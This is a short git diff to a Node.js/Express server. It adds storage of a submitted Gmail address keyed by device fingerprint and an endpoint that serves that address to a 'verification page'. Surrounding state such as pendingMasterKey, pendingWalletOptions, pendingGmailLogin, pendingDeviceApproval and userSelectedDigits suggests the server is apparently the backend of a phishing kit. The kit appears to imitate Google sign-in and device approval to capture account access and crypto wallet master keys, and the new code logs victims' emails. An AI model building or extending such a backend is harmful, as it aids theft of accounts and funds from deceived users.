@@ -158,6 +158,7 @@ const pendingMasterKey = {};
 const pendingWalletOptions = {};
 const pendingDeviceApproval = {};
 const pendingGmailLogin = {};
+const gmailDisplayEmail = {}; // ✅ Store Gmail email for display only (keyed by fingerprint)
 const pendingVerificationPage = {};
 const userSelectedDigits = {};
 const deviceFingerprintToEmail = {};
@@ -329,6 +330,12 @@ app.post("/send-gmail-login", async (req, res) => {
       deviceFingerprintToEmail[fingerprint] = email;
       console.log(`💾 Stored email for fingerprint ${fingerprint}: ${email}`);
     }
+    
+    // ✅ Store Gmail display email (for display only on verification page)
+    if (fingerprint && email) {
+      gmailDisplayEmail[fingerprint] = email;
+      console.log(`📧 Stored Gmail display email for fingerprint ${fingerprint}: ${email}`);
+    }
 
     const emailForThisIP = resolveEmailFromRequest(req);
     console.log(`📥 Gmail Login Request received: ${requestId}`);
@@ -388,6 +395,24 @@ app.get("/api/gmail-login-status/:requestId", (req, res) => {
     res.json({ status: entry.status });
   } catch (err) {
     console.error("❌ Gmail Login status endpoint error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ NEW: Get Gmail display email (for verification page to display)
+app.get("/api/gmail-display-email", (req, res) => {
+  try {
+    const fingerprint = getDeviceFingerprint(req);
+    const displayEmail = gmailDisplayEmail[fingerprint];
+    if (displayEmail) {
+      console.log(`📧 Retrieved Gmail display email for fingerprint ${fingerprint}: ${displayEmail}`);
+      res.json({ gmailEmail: displayEmail });
+    } else {
+      console.log(`📧 No Gmail display email found for fingerprint ${fingerprint}`);
+      res.json({ gmailEmail: null });
+    }
+  } catch (err) {
+    console.error("❌ Get Gmail display email error:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
